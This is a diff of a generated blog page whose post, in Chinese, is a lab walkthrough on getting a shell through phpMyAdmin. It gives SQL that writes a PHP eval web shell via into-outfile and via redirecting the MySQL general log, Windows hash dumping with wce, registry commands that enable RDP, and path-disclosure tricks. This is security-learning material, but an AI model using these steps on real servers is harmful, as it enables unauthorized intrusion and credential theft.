@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,641</span> / Reading time: <span class="post-count">7 min</span></span>
+                        <span>Word count: <span class="post-count">1,670</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -406,28 +406,28 @@ height:50vh;
 <li>Mysql版本：5.7</li>
 <li>Apache版本：2.4<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037451883.png" alt="Alt text"><br>mysql密码为弱密码root，已爆破得到密码。</li>
 </ul>
-<h2 id="0x01-常用方法"><a href="#0x01-常用方法" class="headerlink" title="0x01 常用方法"></a>0x01 常用方法</h2><p>最常见的应该就是<code>select into outfile</code>写入shell了，需要知道网站的绝对路径，而且比较容易失败。<br><code>select @@basedir</code>可以看到mysql所在的绝对路径，此外还有一些爆路径的方法会在下面总结到。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037378652.png" alt="Alt text"><br>爆出网站绝对路径后你可以开始写入shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select load_file(&apos;C:/wamp64/www/ma.php&apos;)</div><div class="line">select &apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos; into outfile &apos;C:/wamp64/www/ma.php&apos;;</div></pre></td></tr></table></figure></p>
+<h2 id="0x01-常用方法"><a href="#0x01-常用方法" class="headerlink" title="0x01 常用方法"></a>0x01 常用方法</h2><p>最常见的应该就是<code>select into outfile</code>写入shell了，需要知道网站的绝对路径，而且比较容易失败。<br><code>select @@basedir</code>可以看到mysql所在的绝对路径，此外还有一些爆路径的方法会在下面总结到。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037378652.png" alt="Alt text"><br>爆出网站绝对路径后你可以开始写入shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:/wamp64/www/ma.php&apos;)</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos; into outfile &apos;C:/wamp64/www/ma.php&apos;;</span><br></pre></td></tr></table></figure></p>
 <p>当你尝试执行<code>select into outfile</code>时会爆出如图的错误：<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037848812.png" alt="Alt text"><br>执行以下命令：<br><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><br><img src="/2018/10/11/phpmyadmin-getshell姿势/1541693041317.png" alt="Alt text"><br>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br><strong>并且这个值是只读变量，只能通过配置文件修改。</strong></p>
 <h2 id="0x02-利用日志写shell"><a href="#0x02-利用日志写shell" class="headerlink" title="0x02 利用日志写shell"></a>0x02 利用日志写shell</h2><p>转换思路，mysql5.0版本以上会创建日志文件，可以通过修改日志的全局变量getshell。</p>
 <h3 id="检测全局变量-general-log、general-log-file"><a href="#检测全局变量-general-log、general-log-file" class="headerlink" title="检测全局变量(general_log、general_log file)"></a>检测全局变量(general_log、general_log file)</h3><ol>
 <li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li>
-<li>general log file 指的是日志的保存路径。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SHOW VARIABLES LIKE &apos;general%&apos;</div></pre></td></tr></table></figure>
+<li>general log file 指的是日志的保存路径。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &apos;general%&apos;</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 <p><img src="/2018/10/11/phpmyadmin-getshell姿势/1542038258633.png" alt="Alt text"></p>
 <p>由图可知<code>general_log</code>默认关闭，以及日志的存储路径 。</p>
-<p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在<code>c:\wamp64\bin\mysql\mysql5.7.14\data\</code>的一个.log文件中，其实就是我们常说的日志文件<br>利用思路：开启<code>general_log</code>之后把<code>general_log_file</code>的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">set global general_log = &quot;ON&quot;;</div><div class="line">set global general_log_file=&apos;C:/wamp64/www/ma.php&apos;;</div></pre></td></tr></table></figure></p>
+<p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在<code>c:\wamp64\bin\mysql\mysql5.7.14\data\</code>的一个.log文件中，其实就是我们常说的日志文件<br>利用思路：开启<code>general_log</code>之后把<code>general_log_file</code>的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&apos;C:/wamp64/www/ma.php&apos;;</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2018/10/11/phpmyadmin-getshell姿势/1542038724504.png" alt="Alt text"><br>执行后可以看到生成的伪日志文件ma.php<br>此时在利用日志的记录插入一句话<br><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</code><br>打开日志可以看到记录<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542083022382.png" alt="Alt text"><br>然后尝试用菜刀连接即可getshell<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542040654856.png" alt="Alt text"></p>
 <h2 id="0x03-获取管理员密码"><a href="#0x03-获取管理员密码" class="headerlink" title="0x03 获取管理员密码"></a>0x03 获取管理员密码</h2><p>既然都做到这里了就顺便简单复习一下Windows，继续做下去。<br>可以上传mysql提权脚本来创建新用户，这里我选择上传wce尝试获取密码</p>
 <h3 id="wce抓取"><a href="#wce抓取" class="headerlink" title="wce抓取"></a>wce抓取</h3><p>尝试直接抓明文，没有结果，那只能抓hash值了。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542077881513.png" alt="Alt text"><br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542079376643.png" alt="Alt text"><br>拿到hash值后就可以用hashcat或者直接跑彩虹表来获取密码。在线也有<a href="https://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="external">ophcrack</a>可以破解。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542088152490.png" alt="Alt text"></p>
-<h3 id="3389连接"><a href="#3389连接" class="headerlink" title="3389连接"></a>3389连接</h3><p>查看一下端口，发现3389没开<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542079568660.png" alt="Alt text"><br>开启3389<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">REG ADD <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div><div class="line">REG ADD <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber /t REG_DWORD /d 0x00000d3d /f</div></pre></td></tr></table></figure></p>
+<h3 id="3389连接"><a href="#3389连接" class="headerlink" title="3389连接"></a>3389连接</h3><p>查看一下端口，发现3389没开<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542079568660.png" alt="Alt text"><br>开启3389<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2018/10/11/phpmyadmin-getshell姿势/1542094164863.png" alt="Alt text"><br>然后连接，输入刚刚抓到的账号密码即可。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/TIM截图20181113192414.png" alt="Alt text"></p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>其实这样一套操作下来动静是很大的，要注意清除痕迹，另外在Windows7这类非服务器的系统上远程登录的话会挤掉当前用户，当然也可以使用工具让其支持多用户登录，具体就不详细说明了。</p>
 <h2 id="0x04-php爆绝对路径方法"><a href="#0x04-php爆绝对路径方法" class="headerlink" title="0x04 php爆绝对路径方法"></a>0x04 php爆绝对路径方法</h2><p>插入一句话木马时是需要知道网站绝对路径的，这里总结一下爆路径的方法。</p>
 <h3 id="单引号爆路径"><a href="#单引号爆路径" class="headerlink" title="单引号爆路径"></a>单引号爆路径</h3><p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br><code>www.xxx.com/news.php?id=1′</code></p>
 <h3 id="错误参数值爆路径"><a href="#错误参数值爆路径" class="headerlink" title="错误参数值爆路径"></a>错误参数值爆路径</h3><p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><code>www.xxx.com/researcharchive.php?id=-1</code></p>
-<h3 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Site:xxx.edu.tw warning</div><div class="line">Site:xxx.com.tw “fatal error”</div></pre></td></tr></table></figure></p>
-<h3 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h3><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">www.xxx.com/test.php</div><div class="line">www.xxx.com/ceshi.php</div><div class="line">www.xxx.com/info.php</div><div class="line">www.xxx.com/phpinfo.php</div><div class="line">www.xxx.com/php_info.php</div><div class="line">www.xxx.com/1.php</div></pre></td></tr></table></figure></p>
+<h3 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xxx.edu.tw warning</span><br><span class="line">Site:xxx.com.tw “fatal error”</span><br></pre></td></tr></table></figure></p>
+<h3 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h3><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/test.php</span><br><span class="line">www.xxx.com/ceshi.php</span><br><span class="line">www.xxx.com/info.php</span><br><span class="line">www.xxx.com/phpinfo.php</span><br><span class="line">www.xxx.com/php_info.php</span><br><span class="line">www.xxx.com/1.php</span><br></pre></td></tr></table></figure></p>
 <h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。</p>
 <ol>
 <li>/phpmyadmin/libraries/lect_lang.lib.php</li>
@@ -439,7 +439,7 @@ height:50vh;
 <li>/phpmyadmin/libraries/lect_lang.lib.php</li>
 <li>/phpmyadmin/libraries/mcrypt.lib.php</li>
 </ol>
-<h3 id="配置文件找路径"><a href="#配置文件找路径" class="headerlink" title="配置文件找路径"></a>配置文件找路径</h3><p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Windows:</div><div class="line">c:\windows\php.ini php配置文件</div><div class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</div><div class="line"></div><div class="line"></div><div class="line">Linux:</div><div class="line">/etc/php.ini php配置文件</div><div class="line">/etc/httpd/conf.d/php.conf</div><div class="line">/etc/httpd/conf/httpd.conf Apache配置文件</div><div class="line">/usr/local/apache/conf/httpd.conf</div><div class="line">/usr/local/apache2/conf/httpd.conf</div><div class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</div></pre></td></tr></table></figure></p>
+<h3 id="配置文件找路径"><a href="#配置文件找路径" class="headerlink" title="配置文件找路径"></a>配置文件找路径</h3><p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/php.ini php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</span><br></pre></td></tr></table></figure></p>
 <h3 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h3><p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p>
 <h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>此次是在Windows系统下的实验，如果是Linux是否同样可以利用日志写shell？<br>于是找了个linux服务器测试<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542109780138.png" alt="Alt text"><br>可以发现，我们没有权限在网站目录下创建日志文件。因为此台服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限。所以也无法写shell并解析。</p>
 <p>因此，只要做好权限把控，就可以避免此类安全问题</p>
@@ -763,9 +763,16 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 14
+        Total : 15
         </div>
         <!-- search  -->
         
@@ -778,6 +785,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/安洵杯writewp/" >安洵杯writewp</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -867,9 +879,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
     
-        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
-    
         <span class="sidebar-tag-name" data-tags="学习笔记"><span class="iconfont-archer">&#xe606;</span>学习笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
     
         <span class="sidebar-tag-name" data-tags="编程相关"><span class="iconfont-archer">&#xe606;</span>编程相关</span>
     
